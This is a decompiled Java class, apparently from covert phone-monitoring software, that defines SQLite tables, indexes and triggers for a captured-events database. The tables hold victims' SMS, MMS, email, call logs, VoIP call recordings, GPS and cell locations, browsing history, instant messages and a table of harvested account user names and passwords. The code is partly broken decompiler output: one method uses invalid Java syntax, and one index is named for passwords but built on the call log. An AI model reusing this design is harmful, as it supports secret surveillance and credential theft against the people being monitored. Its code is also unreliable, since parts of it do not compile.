package com.vvt.eventrepository.b;

import com.vvt.eventrepository.a;
import java.io.File;

public class d
{
  private static final boolean a = a.b;
  
  public static String A()
  {
    Object[] arrayOfObject = new Object[6];
    arrayOfObject[0] = "thumbnail";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "full_path";
    arrayOfObject[3] = "actual_size";
    arrayOfObject[4] = "actual_duration";
    arrayOfObject[5] = "media_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY, %3$s TEXT, %4$s INTEGER, %5$s INTEGER, %6$s INTEGER, FOREIGN KEY(media_id) REFERENCES media(_id));", arrayOfObject);
  }
  
  public static String B()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "setting_event";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC);", arrayOfObject);
  }
  
  public static String C()
  {
    Object[] arrayOfObject = new Object[4];
    arrayOfObject[0] = "settingid_event";
    arrayOfObject[1] = "event_id";
    arrayOfObject[2] = "setting_id";
    arrayOfObject[3] = "setting_value";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER NOT NULL, %3$s INTEGER NOT NULL,%4$s TEXT);", arrayOfObject);
  }
  
  public static String D()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "password";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "app_id";
    arrayOfObject[4] = "app_name";
    arrayOfObject[5] = "app_type";
    arrayOfObject[6] = "account_name";
    arrayOfObject[7] = "user_name";
    arrayOfObject[8] = "password";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s TEXT, %5$s TEXT, %6$s INTEGER, %7$s TEXT, %8$s TEXT, %9$s TEXT)", arrayOfObject);
  }
  
  public static String E()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "event_base";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX sequence_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String F()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "system";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX system_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String G()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "panic";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX panic_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String H()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "location";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX location_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String I()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "browser_url";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX browser_url_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String J()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "application";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX application_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String K()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "call_log";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX call_log_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String L()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "voip_call_log";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX voip_call_log_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String M()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "voip_call_recording";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX voip_call_recording_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String N()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "sms";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX sms_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String O()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "mms";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX mms_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String P()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "email";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX email_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String Q()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "media";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX media_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String R()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "attachment";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX attachment_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String S()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "recipient";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX recipient_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String T()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "gps_tag";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX gps_tag_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String U()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "call_tag";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX call_tag_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String V()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "thumbnail";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX thumbnail_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String W()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "setting_event";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX settingevent_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String X()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX imevent_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String Y()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im_message";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX im_message_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String Z()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im_attachment";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX im_attachment_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String a()
  {
    Object[] arrayOfObject = new Object[5];
    arrayOfObject[0] = "event_base";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "event_type";
    arrayOfObject[3] = "event_id";
    arrayOfObject[4] = "direction";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER)", arrayOfObject);
  }
  
  public static String a(String paramString)
  {
    if (paramString != null)
    {
      localObject = paramString.trim();
      int i = ((String)localObject).length();
      if (i != 0) {
        break label31;
      }
    }
    for (Object localObject = "events.db";; localObject = ((File)localObject).getPath())
    {
      boolean bool = a;
      if (bool) {}
      return (String)localObject;
      label31:
      localObject = new java/io/File;
      String str = "events.db";
      ((File)localObject).<init>(paramString, str);
    }
  }
  
  public static String aa()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im_share_location";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX im_sharelocation_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String ab()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im_conversation";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX im_conversation_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String ac()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im_account";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX im_account_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String ad()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "im_contacts";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX im_contact_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String ae()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "call_log";
    arrayOfObject[1] = "_id";
    return String.format("CREATE INDEX password_index ON %1$s (%2$s)", arrayOfObject);
  }
  
  public static String af()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "voip_call_recording";
    arrayOfObject[1] = "attachment";
    arrayOfObject[2] = "call_recording_id";
    return String.format("CREATE TRIGGER delete_voip_call_rec_attachment AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String ag()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "mms";
    arrayOfObject[1] = "attachment";
    arrayOfObject[2] = "mms_id";
    return String.format("CREATE TRIGGER delete_mms_attachment AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String ah()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "email";
    arrayOfObject[1] = "attachment";
    arrayOfObject[2] = "email_id";
    return String.format("CREATE TRIGGER delete_email_attachment AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String ai()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "sms";
    arrayOfObject[1] = "recipient";
    arrayOfObject[2] = "sms_id";
    return String.format("CREATE TRIGGER delete_sms_recipient AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String aj()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "mms";
    arrayOfObject[1] = "recipient";
    arrayOfObject[2] = "mms_id";
    return String.format("CREATE TRIGGER delete_mms_recipient AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String ak()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "email";
    arrayOfObject[1] = "recipient";
    arrayOfObject[2] = "email_id";
    return String.format("CREATE TRIGGER delete_email_recipient AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String al()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "media";
    arrayOfObject[1] = "gps_tag";
    arrayOfObject[2] = "_id";
    return String.format("CREATE TRIGGER delete_gps_tag AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String am()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "media";
    arrayOfObject[1] = "call_tag";
    arrayOfObject[2] = "_id";
    return String.format("CREATE TRIGGER delete_call_tag AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String an()
  {
    Object[] arrayOfObject = new Object[4];
    arrayOfObject[0] = "media";
    arrayOfObject[1] = "thumbnail";
    arrayOfObject[2] = "media_id";
    arrayOfObject[3] = "thumbnail_delivered";
    return String.format("CREATE TRIGGER delete_thumbnail AFTER UPDATE OF  thumbnail_delivered ON %1$s BEGIN DELETE FROM %2$s WHERE  new._id = %2$s.%3$s AND new.%4$s = 1; END;", arrayOfObject);
  }
  
  public static String ao()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "setting_event";
    arrayOfObject[1] = "settingid_event";
    arrayOfObject[2] = "event_id";
    return String.format("CREATE TRIGGER delete_settingidvalue AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String ap()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "im";
    arrayOfObject[1] = "participants";
    arrayOfObject[2] = "im_id";
    return String.format("CREATE TRIGGER delete_imidvalue AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
  }
  
  public static String aq()
  {
    Object[] arrayOfObject = new Object[5];
    arrayOfObject[0] = "im_message";
    arrayOfObject[1] = "im_attachment";
    arrayOfObject[2] = "msg_id";
    arrayOfObject[3] = "im_share_location";
    arrayOfObject[4] = "msg_id";
    return String.format("CREATE TRIGGER delete_im_message_idvalue AFTER DELETE ON %1$s FOR EACH ROW BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; DELETE FROM %4$s WHERE old._id = %4$s.%5$s; END;", arrayOfObject);
  }
  
  public static String ar()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "im_conversation";
    arrayOfObject[1] = "im_conversation_member";
    arrayOfObject[2] = "conversation_rowid";
    return String.format("CREATE TRIGGER delete_im_conversation_idvalue AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s;END;", arrayOfObject);
  }
  
  public static String b()
  {
    Object[] arrayOfObject = new Object[6];
    arrayOfObject[0] = "system";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "log_type";
    arrayOfObject[4] = "direction";
    arrayOfObject[5] = "message";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s TEXT)", arrayOfObject);
  }
  
  public static String c()
  {
    Object[] arrayOfObject = new Object[4];
    arrayOfObject[0] = "panic";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "panic_status";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER);", arrayOfObject);
  }
  
  public static String d()
  {
    Object[] arrayOfObject = new Object[8];
    arrayOfObject[0] = "browser_url";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "title";
    arrayOfObject[4] = "url";
    arrayOfObject[5] = "visit_time";
    arrayOfObject[6] = "is_blocked";
    arrayOfObject[7] = "owning_app";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s TEXT, %5$s TEXT, %6$s NUMERIC, %7$s INTEGER, %8$s TEXT);", arrayOfObject);
  }
  
  public static String e()
  {
    Object[] arrayOfObject = new Object[10];
    arrayOfObject[0] = "application";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "state";
    arrayOfObject[4] = "type";
    arrayOfObject[5] = "app_id";
    arrayOfObject[6] = "name";
    arrayOfObject[7] = "version";
    arrayOfObject[8] = "size";
    arrayOfObject[9] = "icon";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s TEXT, %7$s TEXT, %8$s TEXT, %9$s INTEGER, %10$s BLOB);", arrayOfObject);
  }
  
  public static String f()
  {
    Object[] arrayOfObject = new Object[7];
    arrayOfObject[0] = "call_log";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "direction";
    arrayOfObject[4] = "duration";
    arrayOfObject[5] = "number";
    arrayOfObject[6] = "contact_name";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s TEXT, %7$s TEXT);", arrayOfObject);
  }
  
  public static String g()
  {
    Object[] arrayOfObject = new Object[11];
    arrayOfObject[0] = "voip_call_log";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "category";
    arrayOfObject[4] = "direction";
    arrayOfObject[5] = "duration";
    arrayOfObject[6] = "user_id";
    arrayOfObject[7] = "contact_name";
    arrayOfObject[8] = "transferred_bytes";
    arrayOfObject[9] = "is_monitor";
    arrayOfObject[10] = "frame_strip_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s INTEGER, %7$s TEXT, %8$s TEXT,%9$s INTEGER, %10$s INTEGER, %11$s INTEGER);", arrayOfObject);
  }
  
  public static String h()
  {
    Object[] arrayOfObject = new Object[11];
    arrayOfObject[0] = "voip_call_recording";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "category";
    arrayOfObject[4] = "direction";
    arrayOfObject[5] = "duration";
    arrayOfObject[6] = "owner_id";
    arrayOfObject[7] = "owner_contact_name";
    arrayOfObject[8] = "is_monitor";
    arrayOfObject[9] = "file_name";
    arrayOfObject[10] = "format";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s INTEGER, %7$s TEXT, %8$s TEXT,%9$s INTEGER, %10$s TEXT, %11$s INTEGER);", arrayOfObject);
  }
  
  public static String i()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "mms";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "direction";
    arrayOfObject[4] = "sender_number";
    arrayOfObject[5] = "contact_name";
    arrayOfObject[6] = "subject";
    arrayOfObject[7] = "message";
    arrayOfObject[8] = "conversation_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s TEXT, %6$s TEXT, %7$s TEXT, %8$s TEXT, %9$s INTEGER);", arrayOfObject);
  }
  
  public static String j()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "sms";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "conversation_id";
    arrayOfObject[4] = "direction";
    arrayOfObject[5] = "sender_number";
    arrayOfObject[6] = "contact_name";
    arrayOfObject[7] = "subject";
    arrayOfObject[8] = "message";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s TEXT, %7$s TEXT, %8$s TEXT, %9$s TEXT);", arrayOfObject);
  }
  
  public static String k()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "email";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "direction";
    arrayOfObject[4] = "sender_email";
    arrayOfObject[5] = "contact_name";
    arrayOfObject[6] = "subject";
    arrayOfObject[7] = "message";
    arrayOfObject[8] = "html_text";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s TEXT, %6$s TEXT, %7$s TEXT, %8$s TEXT, %9$s TEXT);", arrayOfObject);
  }
  
  public static String l()
  {
    Object[] arrayOfObject = new Object[20];
    arrayOfObject[0] = "location";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "latitude";
    arrayOfObject[4] = "longitude";
    arrayOfObject[5] = "altitude";
    arrayOfObject[6] = "horizontal_accuracy";
    arrayOfObject[7] = "vertical_accuracy";
    arrayOfObject[8] = "speed";
    arrayOfObject[9] = "heading";
    arrayOfObject[10] = "datum_id";
    arrayOfObject[11] = "networkid";
    arrayOfObject[12] = "networkname";
    arrayOfObject[13] = "cellid";
    arrayOfObject[14] = "cellname";
    arrayOfObject[15] = "areacode";
    arrayOfObject[16] = "countrycode";
    arrayOfObject[17] = "calling_module";
    arrayOfObject[18] = "method";
    arrayOfObject[19] = "provider";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s REAL, %5$s REAL, %6$s REAL, %7$s REAL, %8$s REAL, %9$s REAL, %10$s REAL, %11$s INTEGER, %12$s TEXT, %13$s TEXT, %14$s INTEGER, %15$s TEXT, %16$s TEXT, %17$s TEXT, %18$s INTEGER, %19$s INTEGER, %20$s INTEGER);", arrayOfObject);
  }
  
  public static String m()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "media";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "full_path";
    arrayOfObject[4] = "media_event_type";
    arrayOfObject[5] = "thumbnail_delivered";
    arrayOfObject[6] = "has_thumbnail";
    arrayOfObject[7] = "media_duration";
    arrayOfObject[8] = "camera_type";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s TEXT, %5$s INTEGER, %6$s INTEGER, %7$s INTEGER, %8$s INTEGER, %9$s INTEGER);", arrayOfObject);
  }
  
  public static String n()
  {
    Object[] arrayOfObject = new Object[7];
    arrayOfObject[0] = "attachment";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "full_path";
    arrayOfObject[3] = "mms_id";
    arrayOfObject[4] = "email_id";
    arrayOfObject[5] = "file_path";
    arrayOfObject[6] = "call_recording_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s TEXT, %4$s INTEGER, %5$s INTEGER, %6$s TEXT, %7$s INTEGER, FOREIGN KEY(mms_id) REFERENCES mms(_id), FOREIGN KEY(email_id) REFERENCES email(_id), FOREIGN KEY(call_recording_id) REFERENCES voip_call_recording(_id));", arrayOfObject);
  }
  
  public static String o()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "recipient";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "recipient";
    arrayOfObject[3] = "contact_name";
    arrayOfObject[4] = "recipient_type";
    arrayOfObject[5] = "sms_id";
    arrayOfObject[6] = "mms_id";
    arrayOfObject[7] = "email_id";
    arrayOfObject[8] = "call_recording_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT,  %3$s TEXT, %4$s TEXT, %5$s INTEGER, %6$s INTEGER, %7$s INTEGER, %8$s INTEGER, %9$s INTEGER, FOREIGN KEY(sms_id) REFERENCES sms(_id), FOREIGN KEY(mms_id) REFERENCES mms(_id), FOREIGN KEY(email_id) REFERENCES email(_id), FOREIGN KEY(call_recording_id) REFERENCES voip_call_recording(_id)); ", arrayOfObject);
  }
  
  public static String p()
  {
    Object[] arrayOfObject = new Object[8];
    arrayOfObject[0] = "im";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "direction";
    arrayOfObject[4] = "user_id";
    arrayOfObject[5] = "im_service_id";
    arrayOfObject[6] = "message";
    arrayOfObject[7] = "user_display_name";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER, %6$s INTEGER, %7$s TEXT, %8$s TEXT);", arrayOfObject);
  }
  
  public static String q()
  {
    Object[] arrayOfObject = new Object[13];
    arrayOfObject[0] = "im_message";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "direction";
    arrayOfObject[4] = "im_service_id";
    arrayOfObject[5] = "conversation_id";
    arrayOfObject[6] = "message_originator_id";
    arrayOfObject[7] = "message_location_place";
    arrayOfObject[8] = "message_longitude";
    arrayOfObject[9] = "message_lattitude";
    arrayOfObject[10] = "message_hor_accuracy";
    arrayOfObject[11] = "text_representation";
    arrayOfObject[12] = "message_data";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s INTEGER NOT NULL, %6$s TEXT NOT NULL, %7$s TEXT, %8$s TEXT, %9$s REAL, %10$s REAL, %11$s REAL, %12$s INTEGER, %13$s TEXT);", arrayOfObject);
  }
  
  public static String r()
  {
    Object[] arrayOfObject = new Object[7];
    arrayOfObject[0] = "im_share_location";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "msg_id";
    arrayOfObject[3] = "location_place";
    arrayOfObject[4] = "longitude";
    arrayOfObject[5] = "lattitude";
    arrayOfObject[6] = "hor_accuracy";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s INTEGER NOT NULL, %4$s TEXT, %5$s REAL, %6$s REAL, %7$s REAL);", arrayOfObject);
  }
  
  public static String s()
  {
    Object[] arrayOfObject = new Object[7];
    arrayOfObject[0] = "im_attachment";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "msg_id";
    arrayOfObject[3] = "fullname";
    arrayOfObject[4] = "mime_type";
    arrayOfObject[5] = "thumbnail_path";
    arrayOfObject[6] = "file_path";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s INTEGER NOT NULL, %4$s TEXT, %5$s TEXT, %6$s TEXT, %7$s TEXT);", arrayOfObject);
  }
  
  public static String t()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "im_conversation";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "im_service_id";
    arrayOfObject[4] = "owner_id";
    arrayOfObject[5] = "conversation_id";
    arrayOfObject[6] = "profile_picture_path";
    arrayOfObject[7] = "title";
    arrayOfObject[8] = "status_message";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER NOT NULL, %5$s TEXT NOT NULL, %6$s TEXT NOT NULL, %7$s TEXT, %8$s TEXT, %9$s TEXT);", arrayOfObject);
  }
  
  public static String u()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "im_conversation_member";
    arrayOfObject[1] = "conversation_rowid";
    arrayOfObject[2] = "contact_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER NOT NULL, %3$s TEXT NOT NULL);", arrayOfObject);
  }
  
  public static String v()
  {
    Object[] arrayOfObject = new Object[8];
    arrayOfObject[0] = "im_account";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "im_service_id";
    arrayOfObject[4] = "owner_id";
    arrayOfObject[5] = "display_name";
    arrayOfObject[6] = "profile_picture_path";
    arrayOfObject[7] = "status_message";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER NOT NULL, %5$s TEXT NOT NULL, %6$s TEXT, %7$s TEXT, %8$s TEXT);", arrayOfObject);
  }
  
  public static String w()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "im_contacts";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "time";
    arrayOfObject[3] = "im_service_id";
    arrayOfObject[4] = "owner_id";
    arrayOfObject[5] = "contact_id";
    arrayOfObject[6] = "display_name";
    arrayOfObject[7] = "profile_picture_path";
    arrayOfObject[8] = "status_message";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER NOT NULL, %5$s TEXT NOT NULL, %6$s TEXT NOT NULL, %7$s TEXT, %8$s TEXT, %9$s TEXT);", arrayOfObject);
  }
  
  public static String x()
  {
    Object[] arrayOfObject = new Object[4];
    arrayOfObject[0] = "participants";
    arrayOfObject[1] = "im_id";
    arrayOfObject[2] = "name";
    arrayOfObject[3] = "uid";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER, %3$s TEXT, %4$s TEXT);", arrayOfObject);
  }
  
  public static String y()
  {
    Object[] arrayOfObject = new Object[9];
    arrayOfObject[0] = "gps_tag";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "longitude";
    arrayOfObject[3] = "latitude";
    arrayOfObject[4] = "altitude";
    arrayOfObject[5] = "cell_id";
    arrayOfObject[6] = "area_code";
    arrayOfObject[7] = "network_id";
    arrayOfObject[8] = "country_code";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY, %3$s REAL, %4$s REAL, %5$s REAL, %6$s INTEGER, %7$s TEXT, %8$s TEXT, %9$s TEXT, FOREIGN KEY(_id) REFERENCES media(_id));", arrayOfObject);
  }
  
  public static String z()
  {
    Object[] arrayOfObject = new Object[7];
    arrayOfObject[0] = "call_tag";
    arrayOfObject[1] = "_id";
    arrayOfObject[2] = "direction";
    arrayOfObject[3] = "duration";
    arrayOfObject[4] = "number";
    arrayOfObject[5] = "contact_name";
    arrayOfObject[6] = "media_id";
    return String.format("CREATE TABLE %1$s (%2$s INTEGER PRIMARY KEY AUTOINCREMENT, %3$s NUMERIC, %4$s INTEGER, %5$s TEXT, %6$s TEXT, %7$s INTEGER, FOREIGN KEY(media_id) REFERENCES media(_id));", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventrepository/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */